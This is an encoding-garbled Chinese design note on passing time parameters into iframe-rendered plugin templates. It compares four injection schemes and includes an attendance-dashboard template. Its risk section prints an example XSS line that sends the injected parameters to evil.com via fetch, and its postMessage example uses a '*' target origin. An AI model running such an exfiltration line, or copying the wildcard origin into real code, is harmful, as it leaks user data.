è¯´æ˜ï¼š

åœ¨ç»˜åˆ¶å¥½èŠ‚ç‚¹ä¹‹åï¼Œç”¨æˆ·é€‰æ‹©æ—¶é—´ï¼Œéœ€è¦å°†é€‰æ‹©çš„æ—¶é—´ä¼ é€’åˆ°æ’ä»¶é‡Œé¢

ä¹Ÿå°±æ˜¯node_graph_web.jsä¸­çš„objdata.selected_timeä¼ é€’åˆ°æ¨¡æ¿ä¸­

åœ¨node_graph_web.jsä¸­æœ‰ä¸¤ä¸ªå‚æ•°selected_timeå’Œtime_granularityï¼Œç„¶åéœ€æ±‚æ˜¯ï¼Œæˆ‘åœ¨æ¸²æŸ“codeç±»å‹çš„èŠ‚ç‚¹çš„æ—¶å€™ï¼Œéœ€è¦å°†è¿™ä¸¤ä¸ªå‚æ•°ä¼ é€’åˆ°æ¸²æŸ“çš„htmlä¸­ï¼Œè€Œplugin_model.htmlæ˜¯æ¸²æŸ“çš„codeç±»å‹æ¨¡æ¿ï¼Œè¯¥å¦‚ä½•ä¿®æ”¹ï¼Ÿæ¨¡æ¿ä¸­å¦‚ä½•æ¥æ”¶ï¼Ÿ



## æ€è·¯ä»¥åŠå®ç°æµç¨‹

æ¸²æŸ“å‰å°†å‚æ•°å°è£…åˆ°contenté‡Œé¢ï¼Œç„¶ååœ¨æ¨¡æ¿ä¸­è§£æå¾—åˆ°

**åœ¨ iframe çš„ HTML æ–‡æ¡£ä¸­æ³¨å…¥ JavaScript ä»£ç **ï¼Œåœ¨é¡µé¢åŠ è½½æ—¶å°±å°†å‚æ•°è®¾ç½®ä¸ºå…¨å±€å˜é‡ã€‚

### æµç¨‹

```mermaid
graph TD
    A[å¼€å§‹: èŠ‚ç‚¹éœ€è¦æ¸²æŸ“] --> B[å‡†å¤‡å‚æ•°å¯¹è±¡]
    B --> |params = selected_time, time_granularity...| C[JSONåºåˆ—åŒ–]
    C --> |JSON.stringify| D[æ„é€ æ³¨å…¥è„šæœ¬]
    D --> |scriptæ ‡ç­¾ + å‚æ•°JSON| E{æ˜¯å¦å®Œæ•´HTML?}
    
    E --> |æ˜¯| F1[æ³¨å…¥åˆ°ç°æœ‰HTMLçš„head]
    E --> |å¦| F2[åŒ…è£…ä¸ºå®Œæ•´HTMLæ–‡æ¡£]
    
    F1 --> G[ç»„è£…æœ€ç»ˆHTMLå­—ç¬¦ä¸²]
    F2 --> G
    
    G --> H[åˆ›å»ºBlobå¯¹è±¡]
    H --> |new Blob htmlContent, type: text/html| I[ç”ŸæˆBlob URL]
    I --> |URL.createObjectURL| J[åˆ›å»ºiframeå…ƒç´ ]
    J --> K[è®¾ç½®iframe.src = blobUrl]
    K --> L[æ·»åŠ åˆ°DOMå®¹å™¨]
    
    L --> M[æµè§ˆå™¨åŠ è½½iframe]
    M --> N[è§£æHTMLæ–‡æ¡£]
    N --> O[æ‰§è¡Œheadä¸­çš„æ³¨å…¥è„šæœ¬]
    O --> |window.NODE_PARAMS = ...| P[æ¸²æŸ“bodyå†…å®¹]
    P --> Q[æ‰§è¡Œç”¨æˆ·è„šæœ¬]
    Q --> |è®¿é—®window.NODE_PARAMS| R[å®Œæˆæ¸²æŸ“]
    
    style B fill:#e1f5ff
    style C fill:#fff3e0
    style D fill:#f3e5f5
    style G fill:#e8f5e9
    style I fill:#fff9c4
    style O fill:#ffebee
    style Q fill:#e0f2f1
    style R fill:#c8e6c9
```

### è¯¦ç»†æµç¨‹

```mermaid
sequenceDiagram
    participant NG as node_graph_web.js
    participant CR as content_renderer.js
    participant IM as IframeManager
    participant Browser as æµè§ˆå™¨
    participant IFrame as iframeæ–‡æ¡£
    participant User as ç”¨æˆ·HTML

    Note over NG: 1. å‡†å¤‡é˜¶æ®µ
    NG->>NG: åˆ›å»ºèŠ‚ç‚¹æ—¶è·å–å‚æ•°
    Note right of NG: params = {<br/>  selected_time: "2025-01-15",<br/>  time_granularity: "day"<br/>}

    NG->>CR: createNodeIframe(cfg)
    Note right of NG: ä¼ å…¥èŠ‚ç‚¹é…ç½®ä¿¡æ¯

    Note over CR: 2. æ„å»ºé˜¶æ®µ
    CR->>CR: å‡†å¤‡å‚æ•°å¯¹è±¡
    CR->>CR: JSON.stringify(params)
    Note right of CR: åºåˆ—åŒ–ä¸ºå­—ç¬¦ä¸²

    CR->>IM: IframeManager.create(id, content, isComplete, params)
    
    Note over IM: 3. HTMLæ³¨å…¥é˜¶æ®µ
    IM->>IM: æ„é€ æ³¨å…¥è„šæœ¬
    Note right of IM: script = '<script><br/>window.NODE_PARAMS = ' + jsonStr + '<br/></script>'

    alt å®Œæ•´HTMLæ–‡æ¡£
        IM->>IM: injectParamsToCompleteHtml()
        Note right of IM: åœ¨</head>å‰æ’å…¥script
    else éå®Œæ•´HTML
        IM->>IM: wrapHtmlContent()
        Note right of IM: åŒ…è£…ä¸ºå®Œæ•´æ–‡æ¡£<br/>å°†scriptæ”¾åœ¨headä¸­
    end

    IM->>IM: ç»„è£…æœ€ç»ˆHTMLå­—ç¬¦ä¸²
    Note right of IM: finalHtml = '<br/><!DOCTYPE html><br/><head><br/>  <script>window.NODE_PARAMS={...}</script><br/></head><br/><body>ç”¨æˆ·å†…å®¹</body>'

    Note over IM: 4. Blobåˆ›å»ºé˜¶æ®µ
    IM->>Browser: new Blob([finalHtml], {type: 'text/html'})
    Browser-->>IM: è¿”å›Blobå¯¹è±¡
    
    IM->>Browser: URL.createObjectURL(blob)
    Browser-->>IM: è¿”å›blobUrl
    Note right of Browser: blob:http://localhost/xxx

    Note over IM: 5. iframeåˆ›å»ºé˜¶æ®µ
    IM->>Browser: createElement('iframe')
    IM->>Browser: iframe.src = blobUrl
    IM->>Browser: container.appendChild(iframe)

    Note over Browser,IFrame: 6. æµè§ˆå™¨åŠ è½½é˜¶æ®µ
    Browser->>IFrame: å¼€å§‹åŠ è½½HTMLæ–‡æ¡£
    IFrame->>IFrame: è§£æHTML
    IFrame->>IFrame: æ‰§è¡Œ<head>ä¸­çš„script
    Note right of IFrame: æ‰§è¡Œ: window.NODE_PARAMS = {...}
    
    IFrame->>IFrame: æ¸²æŸ“<body>å†…å®¹
    IFrame->>User: åŠ è½½ç”¨æˆ·HTML
    
    Note over User: 7. ç”¨æˆ·ä»£ç æ‰§è¡Œé˜¶æ®µ
    User->>User: æ‰§è¡Œç”¨æˆ·è„šæœ¬
    Note right of User: const time = <br/>window.NODE_PARAMS.selected_time
    
    User->>IFrame: è®¿é—®window.NODE_PARAMS
    IFrame-->>User: è¿”å›å‚æ•°å¯¹è±¡
    
    User->>User: ä½¿ç”¨å‚æ•°æ¸²æŸ“ç•Œé¢
    Note right of User: document.getElementById('time')<br/>.textContent = time

    Note over User: 8. å®Œæˆ
    User-->>NG: æ¸²æŸ“å®Œæˆ
```



## æ½œåœ¨é—®é¢˜åˆ†æ

### ä¼˜åŠ¿ âœ…

#### 1. **ç®€å•ç›´æ¥**

```javascript
// æ— éœ€å¤æ‚çš„é€šä¿¡æœºåˆ¶
const params = window.NODE_PARAMS;
console.log(params.selected_time);
```

#### 2. **åŒæ­¥è®¿é—®**

```javascript
// å‚æ•°åœ¨é¡µé¢åŠ è½½æ—¶å°±å·²å­˜åœ¨ï¼Œæ— éœ€ç­‰å¾…å¼‚æ­¥æ¶ˆæ¯
document.addEventListener('DOMContentLoaded', function() {
    // ç«‹å³å¯ç”¨ï¼Œæ— å»¶è¿Ÿ
    const time = window.NODE_PARAMS.selected_time;
});
```

#### 3. **å…¼å®¹æ€§å¥½**

- ä¸ä¾èµ– postMessage API
- ä¸å—è·¨åŸŸé™åˆ¶ï¼ˆå› ä¸ºæ˜¯æ³¨å…¥åˆ°åŒæºiframeï¼‰
- æ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒ

#### 4. **è°ƒè¯•æ–¹ä¾¿**

```javascript
// å¯ä»¥åœ¨æ§åˆ¶å°ç›´æ¥æŸ¥çœ‹
console.log(window.NODE_PARAMS);
```

### æ½œåœ¨é£é™© âš ï¸

#### 1. **å…¨å±€å‘½åç©ºé—´æ±¡æŸ“**

```javascript
// å¯èƒ½ä¸å…¶ä»–è„šæœ¬å†²çª
window.NODE_PARAMS = {...};  // å¦‚æœé¡µé¢å·²æœ‰åŒåå˜é‡ä¼šè¢«è¦†ç›–

// é£é™©ç¤ºä¾‹
// ä½ çš„ä»£ç 
window.NODE_PARAMS = { selected_time: '2025-01-01' };

// ç¬¬ä¸‰æ–¹åº“ä¹Ÿä½¿ç”¨äº†ç›¸åŒåç§°
window.NODE_PARAMS = { other_data: 'xxx' };  // ä½ çš„å‚æ•°è¢«è¦†ç›–äº†ï¼
```

#### 2. **å‚æ•°å¯è¢«ä¿®æ”¹**

```javascript
// æ¶æ„æˆ–é”™è¯¯ä»£ç å¯èƒ½ä¿®æ”¹å‚æ•°
window.NODE_PARAMS.selected_time = 'hacked!';
delete window.NODE_PARAMS.agent_id;

// è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ Object.freeze()
window.NODE_PARAMS = Object.freeze({
    selected_time: '2025-01-01',
    time_granularity: 'day'
});
```

#### 3. **å®‰å…¨é—®é¢˜**

```javascript
// å¦‚æœHTMLå†…å®¹æ¥è‡ªç”¨æˆ·è¾“å…¥ï¼Œå¯èƒ½å­˜åœ¨XSSé£é™©
// æ¶æ„ç”¨æˆ·å¯èƒ½æ³¨å…¥è„šæœ¬çªƒå–å‚æ•°
<script>
    // æ¶æ„ä»£ç 
    fetch('https://evil.com/steal?params=' + JSON.stringify(window.NODE_PARAMS));
</script>
```

#### 4. **éš¾ä»¥è¿½è¸ªå‚æ•°æ¥æº**

```javascript
// å½“å‡ºç°é—®é¢˜æ—¶ï¼Œä¸å®¹æ˜“ç¡®å®šå‚æ•°æ˜¯ä»å“ªé‡Œæ¥çš„
// ç‰¹åˆ«æ˜¯åœ¨å¤æ‚çš„é¡µé¢ä¸­æœ‰å¤šä¸ªè„šæœ¬æ—¶
```

#### 5. **å†…å­˜æ³„æ¼é£é™©**

```javascript
// å¦‚æœå‚æ•°åŒ…å«å¤§é‡æ•°æ®æˆ–å¼•ç”¨ï¼Œå¯èƒ½å¯¼è‡´å†…å­˜é—®é¢˜
window.NODE_PARAMS = {
    large_data: new Array(1000000).fill('data'),
    // è¿™äº›æ•°æ®ä¼šä¸€ç›´å ç”¨å†…å­˜
};
```

## æ”¹è¿›æ–¹æ¡ˆ ğŸ’¡

###  æ¨èæ–¹æ¡ˆå¯¹æ¯”

| æ–¹æ¡ˆ                            | ä¼˜ç‚¹               | ç¼ºç‚¹               | é€‚ç”¨åœºæ™¯             |
| ------------------------------- | ------------------ | ------------------ | -------------------- |
| **åŸæ–¹æ¡ˆ (window.NODE_PARAMS)** | ç®€å•ã€åŒæ­¥ã€æ˜“ç”¨   | å¯è¢«ä¿®æ”¹ã€å‘½åå†²çª | å¿«é€Ÿå¼€å‘ã€å¯ä¿¡å†…å®¹   |
| **æ–¹æ¡ˆ1 (å‘½åç©ºé—´+å†»ç»“)**       | é˜²ä¿®æ”¹ã€å‡å°‘å†²çª   | ä»å ç”¨å…¨å±€ç©ºé—´     | **æ¨èï¼šå¹³è¡¡æ€§æœ€å¥½** |
| **æ–¹æ¡ˆ2 (postMessage)**         | æœ€å®‰å…¨ã€éš”ç¦»æ€§å¥½   | å¼‚æ­¥ã€å¤æ‚         | é«˜å®‰å…¨è¦æ±‚åœºæ™¯       |
| **æ–¹æ¡ˆ3 (metaæ ‡ç­¾)**            | ä¸æ±¡æŸ“å…¨å±€ã€è¯­ä¹‰åŒ– | éœ€è¦DOMè§£æ        | SEOå‹å¥½åœºæ™¯          |

### å¤§ä½“å®ç°

```js
// ========== æ–¹æ¡ˆ1: ä½¿ç”¨å‘½åç©ºé—´ + å†»ç»“ ==========
const IframeManager = {
    wrapHtmlContent: function(htmlContent, params = {}) {
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <script>
                    // ä½¿ç”¨å‘½åç©ºé—´é¿å…å†²çª
                    window.__NODE_GRAPH__ = window.__NODE_GRAPH__ || {};
                    
                    // å†»ç»“å¯¹è±¡é˜²æ­¢ä¿®æ”¹
                    window.__NODE_GRAPH__.PARAMS = Object.freeze({
                        selected_time: ${JSON.stringify(params.selected_time)},
                        time_granularity: ${JSON.stringify(params.time_granularity)},
                        agent_id: ${JSON.stringify(params.agent_id)},
                        node_id: ${JSON.stringify(params.node_id)},
                        node_name: ${JSON.stringify(params.node_name)}
                    });
                    
                    // æä¾›åªè¯»è®¿é—®å™¨
                    window.__NODE_GRAPH__.getParam = function(key, defaultValue = null) {
                        return this.PARAMS.hasOwnProperty(key) ? this.PARAMS[key] : defaultValue;
                    };
                    
                    // æä¾›éªŒè¯æ–¹æ³•
                    window.__NODE_GRAPH__.validateParams = function() {
                        const required = ['agent_id', 'node_id'];
                        for (let key of required) {
                            if (!this.PARAMS[key]) {
                                console.error('ç¼ºå°‘å¿…éœ€å‚æ•°:', key);
                                return false;
                            }
                        }
                        return true;
                    };
                </script>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body { 
                        font-family: Arial, sans-serif; 
                        font-size: 10px; 
                        line-height: 1.2;
                        overflow: hidden;
                        transform: scale(0.8);
                        transform-origin: top left;
                        width: 125%;
                        height: 125%;
                    }
                </style>
            </head>
            <body>${htmlContent}</body>
            </html>
        `;
    }
};

// ========== æ–¹æ¡ˆ2: ä½¿ç”¨ postMessage é€šä¿¡ ==========
const IframeManager_V2 = {
    create: function(containerId, htmlContent, isComplete = false, params = {}) {
        this.destroy(containerId);

        const container = document.getElementById(containerId);
        if (!container) return null;

        const iframe = document.createElement('iframe');
        iframe.style.cssText = `
            width: 100%;
            height: 100%;
            border: none;
            border-radius: 8px 8px 0 0;
        `;

        htmlContent = $.dehtmlencode(htmlContent);
        const finalHtml = isComplete ? htmlContent : this.wrapHtmlWithMessageListener(htmlContent);
        
        const blob = new Blob([finalHtml], { type: 'text/html; charset=utf-8' });
        const blobUrl = URL.createObjectURL(blob);

        iframe.src = blobUrl;

        // iframeåŠ è½½å®Œæˆåå‘é€å‚æ•°
        iframe.onload = function() {
            iframe.contentWindow.postMessage({
                type: 'NODE_PARAMS',
                params: params
            }, '*');
        };

        container.appendChild(iframe);
        this.iframes.set(containerId, { iframe, params });
        this.blobUrls.set(containerId, blobUrl);

        return iframe;
    },

    wrapHtmlWithMessageListener: function(htmlContent) {
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <script>
                    // ä½¿ç”¨é—­åŒ…ä¿æŠ¤å‚æ•°
                    (function() {
                        let _params = null;
                        let _initialized = false;
                        const _callbacks = [];

                        // ç›‘å¬çˆ¶çª—å£æ¶ˆæ¯
                        window.addEventListener('message', function(event) {
                            if (event.data && event.data.type === 'NODE_PARAMS') {
                                _params = Object.freeze(event.data.params);
                                _initialized = true;
                                
                                // æ‰§è¡Œæ‰€æœ‰ç­‰å¾…çš„å›è°ƒ
                                _callbacks.forEach(cb => cb(_params));
                                _callbacks.length = 0;
                            }
                        });

                        // æš´éœ²API
                        window.NodeParams = {
                            // å¼‚æ­¥è·å–å‚æ•°
                            get: function(callback) {
                                if (_initialized) {
                                    callback(_params);
                                } else {
                                    _callbacks.push(callback);
                                }
                            },
                            
                            // åŒæ­¥è·å–ï¼ˆå¯èƒ½è¿”å›nullï¼‰
                            getSync: function() {
                                return _params;
                            },
                            
                            // è·å–å•ä¸ªå‚æ•°
                            getValue: function(key, defaultValue = null) {
                                return _params && _params.hasOwnProperty(key) 
                                    ? _params[key] 
                                    : defaultValue;
                            },
                            
                            // æ£€æŸ¥æ˜¯å¦å·²åˆå§‹åŒ–
                            isReady: function() {
                                return _initialized;
                            }
                        };
                    })();
                </script>
            </head>
            <body>${htmlContent}</body>
            </html>
        `;
    }
};

// ========== æ–¹æ¡ˆ3: ä½¿ç”¨è‡ªå®šä¹‰å…ƒç´ å­˜å‚¨ ==========
const IframeManager_V3 = {
    wrapHtmlContent: function(htmlContent, params = {}) {
        return `
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <script>
                    // å°†å‚æ•°å­˜å‚¨åœ¨éšè—çš„ meta æ ‡ç­¾ä¸­
                    document.addEventListener('DOMContentLoaded', function() {
                        const paramsMeta = document.querySelector('meta[name="node-params"]');
                        if (paramsMeta) {
                            try {
                                const params = JSON.parse(paramsMeta.content);
                                
                                // åˆ›å»ºåªè¯»è®¿é—®å™¨
                                Object.defineProperty(window, 'NodeParams', {
                                    value: Object.freeze(params),
                                    writable: false,
                                    configurable: false
                                });
                            } catch (e) {
                                console.error('è§£æå‚æ•°å¤±è´¥:', e);
                            }
                        }
                    });
                </script>
                <!-- å‚æ•°å­˜å‚¨åœ¨ meta æ ‡ç­¾ä¸­ -->
                <meta name="node-params" content='${JSON.stringify(params).replace(/'/g, "&#39;")}'>
            </head>
            <body>${htmlContent}</body>
            </html>
        `;
    }
};

// ========== ä½¿ç”¨ç¤ºä¾‹ ==========

// åœ¨ plugin_model.html ä¸­ä½¿ç”¨æ–¹æ¡ˆ1
/*
<script>
    // ä½¿ç”¨å‘½åç©ºé—´æ–¹å¼
    const params = window.__NODE_GRAPH__.PARAMS;
    console.log(params.selected_time);
    
    // ä½¿ç”¨è®¿é—®å™¨
    const time = window.__NODE_GRAPH__.getParam('selected_time', '');
    
    // éªŒè¯å‚æ•°
    if (window.__NODE_GRAPH__.validateParams()) {
        // å‚æ•°æœ‰æ•ˆï¼Œæ‰§è¡Œä¸šåŠ¡é€»è¾‘
    }
</script>
*/

// åœ¨ plugin_model.html ä¸­ä½¿ç”¨æ–¹æ¡ˆ2
/*
<script>
    // å¼‚æ­¥æ–¹å¼
    NodeParams.get(function(params) {
        console.log('æ¥æ”¶åˆ°å‚æ•°:', params);
        console.log('é€‰æ‹©æ—¶é—´:', params.selected_time);
    });
    
    // æˆ–ä½¿ç”¨åŒæ­¥æ–¹å¼ï¼ˆå¯èƒ½ä¸ºnullï¼‰
    const params = NodeParams.getSync();
    if (params) {
        console.log(params.selected_time);
    }
    
    // è·å–å•ä¸ªå€¼
    const time = NodeParams.getValue('selected_time', 'é»˜è®¤å€¼');
</script>
*/

// åœ¨ plugin_model.html ä¸­ä½¿ç”¨æ–¹æ¡ˆ3
/*
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // å‚æ•°ä¼šè‡ªåŠ¨æ³¨å…¥åˆ° window.NodeParams
        console.log(window.NodeParams);
        console.log(window.NodeParams.selected_time);
        
        // å°è¯•ä¿®æ”¹ä¼šå¤±è´¥
        window.NodeParams = {}; // æ— æ•ˆ
        window.NodeParams.selected_time = 'new'; // æ— æ•ˆ
    });
</script>
*/
```

## å»ºè®®

å¯¹äºä½ çš„é¡¹ç›®ï¼Œæˆ‘æ¨èä½¿ç”¨**æ–¹æ¡ˆ1ï¼ˆå‘½åç©ºé—´+å†»ç»“ï¼‰**ï¼Œå› ä¸ºï¼š

1. âœ… ä¿æŒäº†åŸæ–¹æ¡ˆçš„ç®€å•æ€§
2. âœ… é€šè¿‡å‘½åç©ºé—´é¿å…å†²çª
3. âœ… é€šè¿‡ `Object.freeze()` é˜²æ­¢ä¿®æ”¹
4. âœ… æä¾›äº†è¾…åŠ©æ–¹æ³•å’ŒéªŒè¯
5. âœ… è°ƒè¯•å‹å¥½
6. âœ… æ€§èƒ½å¼€é”€å°

å¦‚æœä½ çš„HTMLå†…å®¹æ¥è‡ªä¸å¯ä¿¡æ¥æºï¼Œåˆ™åº”è¯¥ä½¿ç”¨**æ–¹æ¡ˆ2ï¼ˆpostMessageï¼‰**ä»¥è·å¾—æœ€ä½³å®‰å…¨æ€§ã€‚

## æ’ä»¶æ¨¡æ¿1.0

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xxxx</title>
</head>
<body>

<!-- TODO æ”¾çš„å†…å®¹-->




</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const params = window.NODE_PARAMS || {};
        console.log('params:', params);
        if (params.selected_time || params.time_granularity) {
            loadDataByTime(params.selected_time, params.time_granularity);
        }
    });

    /**
    * @param {object} selectedTime é€‰æ‹©çš„æ—¶é—´
    * @param {string} granularity æ—¶é—´ç»´åº¦
    * */
    function loadDataByTime(selectedTime, granularity) {
        console.log(`åŠ è½½æ•°æ®: é€‰æ‹©çš„æ—¶é—´=${selectedTime}, æ—¶é—´ç»´åº¦=${granularity}`);
        // TODO è¿™é‡Œå®ç°ä½ çš„ä¸šåŠ¡é€»è¾‘ï¼Œæ ¹æ®ä¼ é€’çš„æ—¶é—´å»è·å–æ•°æ®
    }


</script>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        width: 100vw;
        height: 100vh;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
        background: #fff;
        padding: 3.5vw;
        display: flex;
        flex-direction: column;
        overflow: hidden;
    }

/*   TODO å†…å®¹åŒºåŸŸ  è¯´æ˜ï¼šå•ä½ç»Ÿä¸€ä½¿ç”¨vw  å’Œ vh åˆ‡å‹¿è¦†ç›–ä¸Šé¢çš„æ ·å¼  å¦åˆ™ç¼©æ”¾åæ•ˆæœå·® */


</style>
</html>
```

### 1ã€æŒ‰ç…§æ¨¡æ¿åˆ›å»ºåˆå§‹èŠ‚ç‚¹

```html
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>å‡ºå‹¤çŠ¶æ€æµç¨‹</title>
</head>
<body>

<!-- TODO æ”¾çš„å†…å®¹-->
<div class="main-card">
    <!-- é¡¶éƒ¨å¯¼èˆª -->
    <div class="top-nav">
        <div class="nav-item left" id="prevBtn">
            <svg class="nav-arrow" viewBox="0 0 24 24" fill="white">
                <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
            </svg>
            <div class="nav-text">
                <div class="nav-count" id="prevCount">36äºº</div>
                <div class="nav-label">æ˜¨æ™š</div>
            </div>
        </div>

        <!-- ä¸­å¿ƒåœ†å½¢æ˜¾ç¤º -->
        <div class="center-circle">
            <div class="circle-label">ä»Šä¸€ç­å‡ºå‹¤ç‡</div>
            <div class="circle-percentage" id="attendanceRate">100%</div>
            <div class="circle-date" id="currentDate">2025-08-26</div>
        </div>

        <div class="nav-item right" id="nextBtn">
            <div class="nav-text">
                <div class="nav-count" id="nextCount">36äºº</div>
                <div class="nav-label">æ˜æ™š</div>
            </div>
            <svg class="nav-arrow" viewBox="0 0 24 24" fill="white">
                <path d="M8.59 16.59L10 18l6-6-6-6-1.41 1.41L13.17 12z"/>
            </svg>
        </div>
    </div>

    <!-- ç»Ÿè®¡æ•°æ® -->
    <div class="stats-row">
        <div class="stat-item">
            <div class="stat-circle">
                <div class="stat-value" id="leaveCount">0</div>
            </div>
            <div class="stat-label">è¯·å‡</div>
        </div>

        <div class="stat-item">
            <div class="stat-circle">
                <div class="stat-value" id="absentCount">0</div>
            </div>
            <div class="stat-label">ç¼ºå‹¤</div>
        </div>

        <div class="stat-item">
            <div class="stat-circle">
                <div class="stat-value" id="lateCount">0</div>
            </div>
            <div class="stat-label">è¿Ÿåˆ°</div>
        </div>
    </div>
</div>

<!-- æµç¨‹æ­¥éª¤ -->
<div class="process-flow">
    <div class="step-item" id="step1" data-step="leave">
        <div class="step-node">è¯·å‡</div>
        <div class="step-arrow">
            <svg viewBox="0 0 24 24" fill="currentColor">
               <path d="M6 12H18M18 12L12 6M18 12L12 18" stroke="currentColor" stroke-width="2" fill="none"/>
            </svg>
        </div>
    </div>

    <div class="step-item" id="step2" data-step="card">
        <div class="step-node">åˆ·å¡</div>
        <div class="step-arrow">
            <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M6 12H18M18 12L12 6M18 12L12 18" stroke="currentColor" stroke-width="2" fill="none"/>
            </svg>
        </div>
    </div>

    <div class="step-item" id="step3" data-step="check">
        <div class="step-node">ç‚¹å</div>
        <div class="step-arrow">
            <svg viewBox="0 0 24 24" fill="currentColor">
                <path d="M6 12H18M18 12L12 6M18 12L12 18" stroke="currentColor" stroke-width="2" fill="none"/>
            </svg>
        </div>
    </div>

    <div class="step-item" id="step4" data-step="monthly">
        <div class="step-node">æœˆæŠ¥è¡¨</div>
        <div class="step-arrow">
            <svg viewBox="0 0 24 24" fill="currentColor">
              <path d="M6 12H18M18 12L12 6M18 12L12 18" stroke="currentColor" stroke-width="2" fill="none"/>
            </svg>
        </div>
    </div>

    <div class="step-item" id="step5" data-step="yearly">
        <div class="step-node">å¹´æŠ¥è¡¨</div>
    </div>
</div>

</body>

<script>
    document.addEventListener('DOMContentLoaded', function() {
        const params = window.NODE_PARAMS || {};
        console.log('æ¥æ”¶åˆ°çš„å‚æ•°:', params);

        // æ ¹æ®å‚æ•°åŠ è½½æ•°æ®
        if (params.selected_time && params.time_granularity) {
            loadDataByTime(params.selected_time, params.time_granularity);
        } else {
            // æ²¡æœ‰å‚æ•°æ—¶ä½¿ç”¨é»˜è®¤æ•°æ®
            loadDefaultData();
        }

        // æ›´æ–°æµç¨‹çŠ¶æ€
        updateProcessStatus();

        // ç»‘å®šäº‹ä»¶
        bindEvents();

        // å®šæ—¶æ›´æ–°æµç¨‹çŠ¶æ€ï¼ˆæ¯åˆ†é’Ÿæ£€æŸ¥ä¸€æ¬¡ï¼‰
        setInterval(updateProcessStatus, 60000);
    });

    /**
     * æ ¹æ®æ—¶é—´åŠ è½½æ•°æ®
     * @param {string} selectedTime é€‰æ‹©çš„æ—¶é—´
     * @param {string} granularity æ—¶é—´ç»´åº¦ï¼ˆæ—¥ã€æœˆã€å¹´ï¼‰
     */
    function loadDataByTime(selectedTime, granularity) {
        console.log(`åŠ è½½æ•°æ®: æ—¶é—´=${selectedTime}, ç»´åº¦=${granularity}`);

        // æ›´æ–°æ—¥æœŸæ˜¾ç¤º
        document.getElementById('currentDate').textContent = selectedTime;

        // TODO: è¿™é‡Œè°ƒç”¨åç«¯æ¥å£è·å–çœŸå®æ•°æ®
        const mockData = getMockData();

        // æ›´æ–°æ•°æ®æ˜¾ç¤º
        updateDisplay(mockData);
    }

    /**
     * åŠ è½½é»˜è®¤æ•°æ®
     */
    function loadDefaultData() {
        console.log('ä½¿ç”¨é»˜è®¤æ•°æ®');
        const today = new Date();
        const dateStr = formatDate(today, 'yyyy-MM-dd');

        document.getElementById('currentDate').textContent = dateStr;

        const defaultData = {
            attendanceRate: 100,
            leaveCount: 0,
            absentCount: 0,
            lateCount: 0,
            prevCount: 36,
            nextCount: 36
        };

        updateDisplay(defaultData);
    }

    /**
     * è·å–æ¨¡æ‹Ÿæ•°æ®
     */
    function getMockData() {
        return {
            attendanceRate: 100,
            leaveCount: Math.floor(Math.random() * 3),
            absentCount: Math.floor(Math.random() * 3),
            lateCount: Math.floor(Math.random() * 3),
            prevCount: 36,
            nextCount: 36
        };
    }

    /**
     * æ›´æ–°æ˜¾ç¤º
     */
    function updateDisplay(data) {
        document.getElementById('attendanceRate').textContent = data.attendanceRate + '%';
        document.getElementById('leaveCount').textContent = data.leaveCount;
        document.getElementById('absentCount').textContent = data.absentCount;
        document.getElementById('lateCount').textContent = data.lateCount;
        document.getElementById('prevCount').textContent = data.prevCount + 'äºº';
        document.getElementById('nextCount').textContent = data.nextCount + 'äºº';
    }

    /**
     * æ›´æ–°æµç¨‹çŠ¶æ€
     * æ ¹æ®å½“å‰æ—¶é—´åˆ¤æ–­å“ªä¸ªèŠ‚ç‚¹åº”è¯¥é«˜äº®
     */
    function updateProcessStatus() {
        const now = new Date();
        const hours = now.getHours();
        const minutes = now.getMinutes();
        const currentTime = hours * 60 + minutes; // è½¬æ¢ä¸ºåˆ†é’Ÿæ•°

        // å®šä¹‰æ—¶é—´èŠ‚ç‚¹ï¼ˆä»¥åˆ†é’Ÿä¸ºå•ä½ï¼‰
        const LEAVE_END = 7 * 60;          // 7:00 (è¯·å‡æˆªæ­¢)
        const CARD_START = 7 * 60;         // 7:00 (åˆ·å¡å¼€å§‹)
        const CARD_END = 8 * 60;           // 8:00 (åˆ·å¡ç»“æŸ)
        const CHECK_START = 8 * 60;        // 8:00 (ç‚¹åå¼€å§‹)
        const CHECK_END = 12 * 60;         // 12:00 (ç‚¹åç»“æŸ)

        // ç§»é™¤æ‰€æœ‰æ´»åŠ¨çŠ¶æ€
        document.querySelectorAll('.step-item').forEach(item => {
            item.classList.remove('active');
        });

        // æ ¹æ®å½“å‰æ—¶é—´æ¿€æ´»å¯¹åº”èŠ‚ç‚¹
        if (currentTime < LEAVE_END) {
            // 7ç‚¹ä¹‹å‰ï¼šè¯·å‡èŠ‚ç‚¹é«˜äº®
            document.getElementById('step1').classList.add('active');
            console.log('å½“å‰æ—¶é—´æ®µï¼šè¯·å‡æ—¶é—´ï¼ˆ7:00ä¹‹å‰ï¼‰');
        } else if (currentTime >= CARD_START && currentTime < CARD_END) {
            // 7:00-8:00ï¼šåˆ·å¡èŠ‚ç‚¹é«˜äº®
            document.getElementById('step2').classList.add('active');
            console.log('å½“å‰æ—¶é—´æ®µï¼šåˆ·å¡æ—¶é—´ï¼ˆ7:00-8:00ï¼‰');
        } else if (currentTime >= CHECK_START && currentTime < CHECK_END) {
            // 8:00-12:00ï¼šç‚¹åèŠ‚ç‚¹é«˜äº®
            document.getElementById('step3').classList.add('active');
